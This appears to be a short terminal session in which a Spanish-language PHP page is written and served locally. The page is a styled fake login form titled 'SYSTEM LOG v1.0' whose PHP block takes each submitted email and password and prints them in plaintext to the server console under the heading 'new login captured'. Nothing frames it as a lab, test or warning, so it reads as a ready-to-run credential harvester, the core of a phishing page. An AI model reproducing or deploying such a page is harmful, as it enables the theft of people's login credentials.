nano index.html

<?php
// Capturar y mostrar datos en la consola de PHP
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'No enviado';
    $password = $_POST['password'] ?? 'No enviado';

    // Imprime directamente en la terminal donde ejecutas 'php -S'
    error_log("==========================================");
    error_log("[NUEVO INGRESO CAPTURADO]");
    error_log("Correo: " . $email);
    error_log("Contraseña: " . $password);
    error_log("==========================================");
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Log v1.0</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #ffffff;
            font-family: monospace, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-box {
            border: 2px solid #ffcc00;
            padding: 30px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 0 15px rgba(255, 204, 0, 0.2);
            position: relative;
        }
        .tag {
            background: #ffcc00;
            color: #000;
            font-weight: bold;
            padding: 2px 8px;
            position: absolute;
            top: -12px;
            left: 20px;
            font-size: 12px;
        }
        h1 {
            text-align: center;
            color: #ffcc00;
            letter-spacing: 2px;
            font-size: 24px;
            margin-bottom: 25px;
        }
        .status {
            color: #00ff66;
            text-align: center;
            font-size: 13px;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            color: #aaa;
            font-size: 12px;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }
        input {
            width: 100%;
            padding: 10px;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #fff;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border-color: #ffcc00;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #ffcc00;
            border: none;
            color: #000;
            font-weight: bold;
            letter-spacing: 2px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #e6b800;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <span class="tag">SYSTEM LOG // V 1.0</span>
        <h1>INGRESO A DATOS</h1>
        
        <div class="status">
            [ ACCESO CONCEDIDO ] - Bienvenido Operador
        </div>

        <form action="" method="POST">
            <div class="input-group">
                <label>CORREO ELECTRÓNICO</label>
                <input type="email" name="email" placeholder="operador@cod.com" required>
            </div>
            
            <div class="input-group">
                <label>CONTRASEÑA</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>

            <button type="submit">ACCEDER</button>
        </form>
    </div>

</body>
</html>

php -S localhost:8080
